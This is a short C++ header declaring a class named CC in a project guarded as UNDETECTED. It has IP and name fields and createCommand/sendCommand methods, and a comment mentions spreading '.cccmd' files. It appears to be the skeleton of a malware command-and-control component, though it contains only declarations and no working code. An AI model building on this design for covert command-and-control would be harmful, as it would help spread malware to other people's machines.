//
// Created by nn5h on 12/16/19.
//

#ifndef UNDETECTED_CC_H
#define UNDETECTED_CC_H


class CC {
    // starts apache locally + opportunity to spread .cccmd files
    std::string IP;
    std::string name;

public:
    CC();
    CC(std::string name);
    CC(std::string ip, std::string name);
    ~CC();

    std::string getMachineIP();
    std::string getMachineName();
    std::string getIP();
    std::string getName();

    void setIP(std::string newIP);
    void setName(std::string newName);

    std::string createCommand();
    bool sendCommand(std::string command);
};


#endif //UNDETECTED_CC_H
